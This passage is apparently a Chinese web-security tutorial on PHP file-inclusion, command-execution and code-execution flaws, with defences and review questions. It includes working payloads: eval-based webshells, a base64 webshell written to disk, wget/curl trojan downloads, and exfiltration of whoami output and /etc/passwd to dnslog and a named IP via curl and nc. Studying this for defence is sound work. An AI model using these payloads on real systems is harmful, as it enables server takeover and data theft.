</blockquote>
<blockquote>
<p>备注：几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在 PHP Web Application 中居多, 而在 JSP、ASP、<a target="_blank" rel="noopener" href="http://ASP.NET">ASP.NET</a> 程序中却非常少，甚至没有，这是有些语言设计的弊端；在 PHP 中经常出现包含漏洞，但这并不意味这其他语言不存在</p>
</blockquote>
<h2 id="原理-v6"><a class="header-anchor" href="#原理-v6">¶</a>原理</h2>
<p>​		在PHP程序（后端程序）中使用文件包含的对象<strong>可以被前端的用户控制</strong>且<strong>没有经过过滤或严格的定义</strong>，用户可以将其他的文件作为参数带入到PHP代码中解释执行，从而造成<strong>敏感信息泄露</strong>/<strong>程序文件读取</strong>/<strong>GetShell</strong>等危害的漏洞。</p>
<h2 id="高危函数-v2"><a class="header-anchor" href="#高危函数-v2">¶</a>高危函数</h2>
<img src="/posts/d62edc36/1684842263166-e1f4b12f-49de-46ca-8277-52dd79221758.png" class title="image.png">
<ul>
<li>require() 和 include() 函数的区别：使用 require() 函数包含文件时，<strong>只要程序执行，立即调用文件</strong> ，而 include() <strong>只有程序执行到该函数时才调用</strong> 。</li>
<li>其他用于包含的函数: <em>highlight_file()、 show_source()、 readfile()、 file_get_contents()、 fopen()、file()</em></li>
<li>文件包含是执行被包含文件中的PHP代码，而文件打开则是读取文件中的内容不会执行！</li>
</ul>
<h2 id="漏洞利用"><a class="header-anchor" href="#漏洞利用">¶</a>漏洞利用</h2>
<h3 id="本地文件包含-LFI"><a class="header-anchor" href="#本地文件包含-LFI">¶</a>本地文件包含(LFI)</h3>
<p>指通过<strong>相对路径/绝对路径</strong> 的方式能<strong>打开并包含</strong> 本地文件的漏洞，大部分情况遇到的文件包含漏洞都是 LFI  !</p>
<p>包含条件： 用户可以<strong>动态控制变量！</strong></p>
<p><strong>包含图片GetShell</strong></p>
<p>寻找网站上传点并把 php 恶意代码文件改成 <code>jpg</code> 上传到网站上在本地包含引入恶意代码，当文件被引入后代码就被执行。</p>
<p><strong>包含日志GetShell</strong></p>
<p>中间件例如 iis /apache/nginx 这些 web 中间件都会记录访问日志，如果访问日志中或错误日志中， 存在有 php 代码也可以引入到文件包含中，如果日志有 php 恶意代码也可导致 getshell；</p>
<p>在linux下日志文件权限默认是 root 而php 的权限是 <code>www-data</code> 一般情况下都是读取不了，如果是 windows 环境下是可以权限是允许的；</p>
<p><strong>PHP伪协议</strong></p>
<p>PHP 伪协议事实上就是<strong>支持的协议</strong> 与<strong>封装协议</strong></p>
<img src="/posts/d62edc36/1684847477587-c0cee458-c4ce-443b-b17e-751c48fa0022.png" class title="image.png">
<ol>
<li>php.ini参数设置</li>
</ol>
<p>在 php.ini 里有两个重要的参数 <code>allow_url_fopen</code>、<code>allow_url_include</code>；</p>
<ul>
<li>
<p>allow_url_fopen:默认值是 ON。允许 url 里的封装协议访问文件；</p>
</li>
<li>
<p>allow_url_include:默认值是 OFF。不允许包含 url 里的封装协议包含文件；</p>
</li>
</ul>
<p>各协议的利用条件和方法：</p>
<img src="/posts/d62edc36/1684848862756-de52a5f2-f4a0-4c09-99b8-2fc8215498d9.png" class title="img">
<ol>
<li><strong>file://协议</strong></li>
</ol>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs delphi">使用：<span class="hljs-keyword">file</span>:<span class="hljs-comment">//文件的绝对路径和文件名</span><br>举例：<br><span class="hljs-number">123</span>.php?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">file</span>:<span class="hljs-comment">//c:\windows\system32\drivers\etc\hosts</span><br></code></pre></td></tr></table></figure>
<ol start="2">
<li><strong>php://filter协议</strong></li>
</ol>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">用途：常用于读取文件/源码<br><br>使用：?path=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=文件.php<br><br>注意：通过指定末尾的文件，可以读取经 base64 加密后的文件源码 ，之后再 base64 解码，虽然不能直接获取到 shell，但能读取敏感文件 。<br><br>php:<span class="hljs-regexp">//</span>filter 协议与 file:<span class="hljs-regexp">//</span> 协议的区别：file 协议只能使用 绝对路径 ，filter 协议相对路径和绝对路径 都可以使用<br>举例：<br><span class="hljs-number">123</span>.php?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=<span class="hljs-number">123</span>.php<br></code></pre></td></tr></table></figure>
<ol start="3">
<li><strong>php://input协议</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">用途：可以访问请求的的原始数据的只读流。将 post 请求中的数据作为 PHP 代码执行<br>条件：allow_url_include = on<br>举例：<br>?file=php:<span class="hljs-comment">//input</span><br>[POST]：<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span>  (执行POST DATA中的内容)<br></code></pre></td></tr></table></figure>
<ol start="4">
<li><strong>data://</strong></li>
</ol>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">用途：数据（RFC2397）</span><br><span class="language-xml"></span><br><span class="language-xml">使用条件：</span><br><span class="language-xml">allow_url_fopen = on</span><br><span class="language-xml">allow_url_include = on</span><br><span class="language-xml"></span><br><span class="language-xml">使用举例：</span><br><span class="language-xml">?file=data:text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">?file=data:text/plain;base64, PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="language-xml">?file=data:text/plain,<span class="hljs-tag">&lt;<span class="hljs-name">php</span> <span class="hljs-attr">phpinfo</span>();?&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">webshell构造：</span><br><span class="language-xml">URL: http://192.168.172.150/include.php?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>])<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">Webshell密码: 1</span><br></code></pre></td></tr></table></figure>
<ol start="5">
<li><strong>zip://</strong></li>
</ol>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stata">用途：读取压缩包内的文件（绝对路径/相对路径）<br>使用条件：allow_url_fopen = <span class="hljs-keyword">on</span><br><br>使用举例：<br><span class="hljs-keyword">zip</span>:<span class="hljs-comment">//archive.zip                # dir/file.txt</span><br><span class="hljs-keyword">zip</span>:<span class="hljs-comment">//[压缩文件绝对/相对路径]     # [压缩文件内的子文件名]</span><br>?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">zip</span>:<span class="hljs-comment">//D:WWW/file.zip%23phpcode.txt</span><br>?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">zip</span>:<span class="hljs-comment">//D:WWW/file.jpg%23phpcode.txt</span><br>?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">zip</span>:<span class="hljs-comment">//D:WWW/file.jpg%23phpcode</span><br></code></pre></td></tr></table></figure>
<ol start="6">
<li><strong>phar://</strong></li>
</ol>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">用途：读取压缩包内的文件（绝对路径/相对路径）<br>使用条件：allow_url_fopen = on<br>举例：<br>?file=phar:<span class="hljs-regexp">//</span>D:<span class="hljs-regexp">/phpStudy/</span>WWW<span class="hljs-regexp">/fileinclude/</span>test.zip/phpinfo.txt<br>?file=phar:<span class="hljs-regexp">//</span>test.zip/phpinfo.txt<br>其他类似协议：<br>bzip2:<span class="hljs-regexp">//</span><br>zlib:<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure>
<h3 id="远程文件包含-RFI"><a class="header-anchor" href="#远程文件包含-RFI">¶</a>远程文件包含(RFI)</h3>
<p>当远程文件开启时，可以包含远程文件到本地执行也称为<strong>RFI</strong>！</p>
<p>当 <code>allow_url_fopen=On</code> <code>allow_url_include=ON</code> 两个条件同时为 On 允许远程包含文件。</p>
<h3 id="文件包含绕过"><a class="header-anchor" href="#文件包含绕过">¶</a>文件包含绕过</h3>
<p><strong>00截断</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">条件：1. magic_quotes_gpc = Off 2. php 版本 &lt; 5.3.4<br><br>获取 phpinfo.php 文件<br><br>payload：?<span class="hljs-attribute">action</span>=phpinfo.php%00<br></code></pre></td></tr></table></figure>
<p><strong>路径长度截断</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">操作系统存在最大路径长度的限制。可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名截断。<br>Windows下目录的最大路径<span class="hljs-number">256</span>B<br>Linux下目录的最大路径长度为<span class="hljs-number">4096</span>B<br>条件：windows 系统需要长于 <span class="hljs-number">197</span> 字符 (即 &gt;=<span class="hljs-number">198</span>)，超出的部分会被丢弃<br><br>Payload:.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/.../</span> <br></code></pre></td></tr></table></figure>
<p><strong>点号截断</strong></p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lasso">点号截断适用于Windows系统，当点号的长度大于<span class="hljs-number">256</span>B时，就可以造成扩展名截断<br>条件：windows 系统，点号需要长于 <span class="hljs-number">197</span><br>payload:<span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br></code></pre></td></tr></table></figure>
<p><strong>问号绕过</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">·payload：?action=http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">152.143</span>/phpinfo.php?<br></code></pre></td></tr></table></figure>
<p><strong>＃绕过</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>：?action=http://<span class="hljs-number">192.168.152.143</span>/phpinfo.php%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
<p><strong>空格绕过</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">payload：<br>?action=http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">152.143</span>/phpinfo.php%<span class="hljs-number">20</span><br>?action=http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">152.143</span>/phpinfo.php+<br>?action=http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">152.143</span>/phpinfo.php abc<br></code></pre></td></tr></table></figure>
<h3 id="防护-v2"><a class="header-anchor" href="#防护-v2">¶</a><strong>防护</strong></h3>
<ol>
<li>严格判断包含中的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于被包含的文件是否可被外部控制；</li>
<li>路径限制：限制被包含的文件只能在某一文件内，一定要禁止目录跳转字符，如：“…/”；</li>
<li>包含文件验证：验证被包含的文件是否是白名单中的一员；</li>
<li>尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include(‘head.php’)；</li>
<li>设置 allow_url_include 为 Off ；</li>
</ol>
<h3 id="问题-v6"><a class="header-anchor" href="#问题-v6">¶</a>问题</h3>
<p><strong>1.什么是文件包含漏洞？</strong></p>
<p><strong>2.造成文件包含漏洞的高危函数，函数之间的区别！</strong></p>
<p><strong>3.文件包含的伪协议都有哪些？至少6个…</strong></p>
<p><strong>4.简述下文件包含漏洞的利用姿势与防护？</strong></p>
<h1>命令执行/代码执行漏洞</h1>
<h2 id="命令执行漏洞"><a class="header-anchor" href="#命令执行漏洞">¶</a>命令执行漏洞</h2>
<h3 id="概念-v2"><a class="header-anchor" href="#概念-v2">¶</a>概念</h3>
<p>由于PHP程序未对前端用户提交的数据进行严格过滤或限制，从而导致传入的字段被带入到命令执行函数中作为参数执行，造成GetShell或接管服务器权限等高危害的Web漏洞！</p>
<h3 id="漏洞危害"><a class="header-anchor" href="#漏洞危害">¶</a>漏洞危害</h3>
<ul>
<li>继承WEB服务器程序权限，执行系统命令（反弹Shell）</li>
<li>继承WEB服务器程序权限，读写文件（敏感文件）</li>
<li>GetShell控制网站，创建系统后门控制服务器！</li>
</ul>
<h3 id="高危函数-v3"><a class="header-anchor" href="#高危函数-v3">¶</a>高危函数</h3>
<p><strong>1.exec函数</strong></p>
<p>执行一个外部命令。</p>
<p>`<?php echo exec($_POST["cmd"]);?></p>
<?php print exec($_POST["cmd"]);?> //回显输出结果的最后一行`
<p><strong>2.passthru函数</strong></p>
<p>执行外部程序，并且显示原始输出。</p>
<p><code>&lt;?php passthru($_POST[&quot;cmd&quot;]);?&gt;</code></p>
<p><strong>3.proc_open函数</strong></p>
<p>执行一个命令，并且打开用来输入/输出的文件指针。</p>
<p><strong>4.shell_exec函数</strong></p>
<p>通过shell环境执行命令，并且将完整的输出以字符串的方式返回。</p>
<p>`<?php echo shell_exec($_POST["cmd"]); ?></p>
<?php print shell_exec($_POST["cmd"]); ?>  //无回显-必须输出`
<p><strong>5.system函数</strong></p>
<p>执行外部程序，并且显示输出。</p>
<p><code>&lt;?php system($_POST[&quot;cmd&quot;]);?&gt;  //有回显</code></p>
<p><strong>6.popen函数</strong></p>
<p>通过popen()的参数传递一条命令，并对popen()所打开的文件进行执行</p>
<p>只要命令的参数可控就能够执行系统命令。</p>
<p>system($cmd);或者system(‘ping -c 3’ . $target)</p>
<p>当$cmd可控的话就能够执行任意命令，</p>
<p>而当$target可控的话，可以用管道符等特殊字符截断从而执行任意命令。</p>
<p>$target = ‘a | whoami’;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>].<span class="hljs-string">&quot;&gt;&gt; 1.txt&quot;</span>; <span class="hljs-comment">//    结果将输出在当前目录下的1.txt文件内</span><br><span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span>&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);              <span class="hljs-comment">//返回的是文件指针而非命令执行结果</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><strong>7. 反引号 `</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `whoami`<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<span class="hljs-keyword">print</span> `<span class="hljs-variable">$cmd</span>`; <span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//[``]反引号里面的代码也会被当作OS命令来执行</span><br></code></pre></td></tr></table></figure>
<h3 id="命令连接符"><a class="header-anchor" href="#命令连接符">¶</a><strong>命令连接符</strong></h3>
<pre><code class="hljs">|
</code></pre>
<p>管道操作符</p>
<p>可以把前一个命令的标准输出传输到后一个命令的标准输入</p>
<p>比如 a | b表示命令a的输出作为命令b的输入</p>
<p>在远程命令执行中，不管a的执行结果是否正确，b都可以执行</p>
<pre><code class="hljs">||
</code></pre>
<p>逻辑或</p>
<p>注意该命令有短路的情况</p>
<p>比如 a || b，如果命令a执行成功，则命令b不会被执行；只有命令a执行失败的情况下，才会执行命令b</p>
<pre><code class="hljs">&amp;&amp;
</code></pre>
<p>逻辑与</p>
<p>注意该命令有短路的情况</p>
<p>比如 a &amp;&amp; b，如果命令a执行失败，则命令b不会被执行；只有命令a执行成功的情况下，才会执行命令b</p>
<pre><code class="hljs">&amp;
</code></pre>
<p>windows特有</p>
<p>允许在一行内从左向右顺序执行多条命令，前一条命令失败也不影响后一条命令的执行</p>
<p>比如 a &amp; b，不管a是否执行成功，b命令都会执行</p>
<pre><code class="hljs">;
</code></pre>
<p>（可能看不清，这是个分号）</p>
<p><strong>linux系统特有</strong></p>
<p>允许在一行内从左向右顺序执行多条命令，前一条命令失败也不影响后一条命令的执行</p>
<p>比如 a ; b，不管a是否执行成功，b命令都会执行</p>
<h3 id="漏洞利用-v2"><a class="header-anchor" href="#漏洞利用-v2">¶</a>漏洞利用</h3>
<p><strong>挖掘思路</strong></p>
<p>黑盒测试：网络连接测试/文件编辑处/存在系统命令可疑处(后台)+未授权访问！</p>
<p>白盒测试：定位高危的命令执行函数，查看是否有前端可控的字段传入！</p>
<h4 id="1-有回显"><a class="header-anchor" href="#1-有回显">¶</a>1.有回显</h4>
<p><strong>利用1：GetShell</strong></p>
<p>前提是对目标主机具有写入权限，其Linux主机可执行<code>pwd</code>获取绝对路径而Windows主机执行<code>chdir</code>获取绝对路径。</p>
<p><strong>linux主机</strong>通过echo将一句话木马写入php文件中或者可以将base64加密以后再解码写入eg：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWydjbWQnXSk/Pg==&quot;</span>|<span class="hljs-built_in">base64</span> -d &gt;shell.php<br></code></pre></td></tr></table></figure>
<p><strong>windows主机</strong>如果有写入权限和linux操作相同；</p>
<p>如果没有写入权限，就在VPS中开启http服务，利用wget或者curl下载木马文件写入出网的根目录。</p>
<p>eg：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget -o <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>nfo.php http:<span class="hljs-regexp">//</span>www.xx.com/phpinfo.txt<br>curl http:<span class="hljs-regexp">//</span>www.xx.com<span class="hljs-regexp">/phpinfo.txt &gt; /</span>var<span class="hljs-regexp">/www/</span>html/info.php<br></code></pre></td></tr></table></figure>
<p><strong>利用二：读取文件</strong></p>
<p>获取系统敏感信息…</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#Windows</span><br><span class="hljs-built_in">type</span> c:\windows\win.ini <br><span class="hljs-comment">#Linux</span><br><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure>
<h4 id="情景2：无回显"><a class="header-anchor" href="#情景2：无回显">¶</a>情景2：无回显</h4>
<ol>
<li>
<h5 id="DNS解析记录"><a class="header-anchor" href="#DNS解析记录">¶</a>DNS解析记录</h5>
</li>
</ol>
<blockquote>
<p>首先我们知道DNS是域名到IP地址的解析的服务，通过域名可以解析到对应的IP地址。DNSlog就是储存在DNS上的域名相关的信息，它记录着你对域名或者IP的访问信息，也就是类似于日志文件…我们可以使目标主机访问DNSLog平台将我们执行的命令结果带到解析记录中.</p>
</blockquote>
<p><strong>linux主机</strong></p>
<p>利用前面的命令拼接符将想要执行的命令解析到DNS平台eg:</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ping `whoami`.ms1sct.dnslog.cn<br></code></pre></td></tr></table></figure>
<p><strong>windows主机</strong></p>
<p>使用dnslog平台结合<strong>系统变量</strong>来回显系统的一些数据信息</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ping</span> <span class="hljs-variable">%username%</span>.<span class="hljs-number">9</span>yw1y.dnslog.cn<br></code></pre></td></tr></table></figure>
<h6 id="附：windows系统变量"><a class="header-anchor" href="#附：windows系统变量">¶</a>附：windows系统变量</h6>
<img src="/posts/d62edc36/1685366000309-276662e8-346f-4353-ac78-bb379268fcf6.png" class title="image.png">
<img src="/posts/d62edc36/1685366016258-ed5bb3ea-6e88-4bab-926e-9b5ac0d3adb7.png" class title="image.png">
<p><strong>HTTP请求日志</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">VPS：<br>python -m http.server <span class="hljs-number">8080</span>    <span class="hljs-regexp">//</span>python3<br>python -m SimpleHTTPServer <span class="hljs-number">8080</span>      <span class="hljs-regexp">//</span>python2<br><br><br><br>漏洞处：<br> -使用 curl 命令：<br>	ping -c <span class="hljs-number">4</span> || curl http:<span class="hljs-regexp">//</span><span class="hljs-number">101.42</span>.<span class="hljs-number">118.221</span>:<span class="hljs-number">8080</span>/?`whoami`  <br> -使用 wget 命令：<br>	ping -c <span class="hljs-number">4</span> || wget http:<span class="hljs-regexp">//</span><span class="hljs-number">101.42</span>.<span class="hljs-number">118.221</span>:<span class="hljs-number">8080</span>/?`whoami`<br></code></pre></td></tr></table></figure>
<p><strong>NC传递执行结果</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># VPS上执行</span><br><span class="hljs-attribute">nc</span> -l <span class="hljs-number">8080</span><br><span class="hljs-comment"># 漏洞利用点执行</span><br><span class="hljs-attribute">nc</span> <span class="hljs-number">101.42.118.221</span> <span class="hljs-number">8080</span> &lt;/etc/passwd<br></code></pre></td></tr></table></figure>
<p><strong>反弹Shell</strong></p>
<p>反弹Shell应用场景</p>
<ol>
<li>
<p>命令执行处无法执行全部系统命令,常发生在Windows系统下(eg：dir/pwd/…)</p>
</li>
<li>
<p>获取交互式命令执行接口，方便与程序进行交互配置(eg:passwd username)</p>
</li>
<li>
<p>无法Powershell上线CS/无法一键部署挖矿程序情况下进行通信测试！</p>
</li>
</ol>
<h3 id="漏洞防护"><a class="header-anchor" href="#漏洞防护">¶</a>漏洞防护</h3>
<ol>
<li>不执行外部的应用程序或命令：</li>
</ol>
<p>○ 尽量使用自定义函数或函数库实现外部应用程序或命令的功能。在执行 system、eval 等命令执行功能的函 数前，要确认参数内容。</p>
<ol start="2">
<li>使用 <strong>escapeshellarg</strong> 函数处理相关参数：</li>
</ol>
<p>○ escapeshellarg 函数会将用户引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“’”， 双引号““”会被转义为“””，分号“;”会被转义为“;”，这样 escapeshellarg 会将参数内容限制在一对单引号或双引号里面，转义参数中包括的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。</p>
<ol start="3">
<li>使用 <strong>safe_mode_exec_dir</strong> 执行可执行的文件路径 ：</li>
</ol>
<p>○ 将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录，并使用 safe_mode_exec_dir 指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在 safe_mode_exec_dir 指定的目录中才会允许执行，否则执行将失败。</p>
<h2 id="代码执行漏洞"><a class="header-anchor" href="#代码执行漏洞">¶</a>代码执行漏洞</h2>
<h3 id="原理-v7"><a class="header-anchor" href="#原理-v7">¶</a>原理</h3>
<p>​		由于PHP程序未对前端用户提交的数据进行严格过滤或限制，从而导致传入的字段被带入到代码执行函数中作为参数执行，造成GetShell或接管服务器权限等高危害的Web漏洞！</p>
<blockquote>
<p>命令执行漏洞是执行的系统命令；即system()函数等调用命令解释器执行输入的命令；<br>
代码执行漏洞是执行语言代码；即eval()函等将输入进的字符串交给PHP解释器当作PHP代码执行；</p>
</blockquote>
<h3 id="高危函数-v4"><a class="header-anchor" href="#高危函数-v4">¶</a>高危函数</h3>
<p><strong>1.eval函数</strong></p>
<p>mixed eval(string $code) 把字符串$code作为PHP代码执行。</p>
<p><strong>2.assert函数</strong></p>
<p>Bool assert(mixed $assertion[,string $description]) 检查一个断言是否为false（把字符串$assertion作为PHP代码执行）。</p>
<p><strong>3.preg_replace()函数</strong></p>
<p>mixed preg_replace (mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]]) 搜索subject中匹配pattern的部分， 以$replacement进行替换</p>
<blockquote>
<p>preg_replace()函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使 preg_replace() 将 replacement 参数当作 PHP 代码</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">eg:<br><span class="hljs-meta">&lt;?php</span> <br>@<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/abc/e&quot;</span>,<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-string">&quot;abcd&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br>-test.php?cmd=<span class="hljs-title function_ invoke__">phpinfo</span>()<br></code></pre></td></tr></table></figure>
<p><strong>4.create_function()</strong></p>
<p>create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令</p>
<blockquote>
<p>create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令。</p>
</blockquote>
<p>eg:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-variable">$func</span>();<br><span class="hljs-meta">?&gt;</span><br>-test.php?cmd=<span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure>
<p><strong>5. array_map()</strong></p>
<blockquote>
<p>array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。</p>
</blockquote>
<p>eg:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$cmd</span>;<br><span class="hljs-variable">$new_array</span>=<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$array</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$new_array</span>);<br><span class="hljs-meta">?&gt;</span><br>-test.php?func=system&amp;cmd=whoami<br></code></pre></td></tr></table></figure>
<p><strong>6.Call_user_func()/Call_user_func_array()</strong></p>
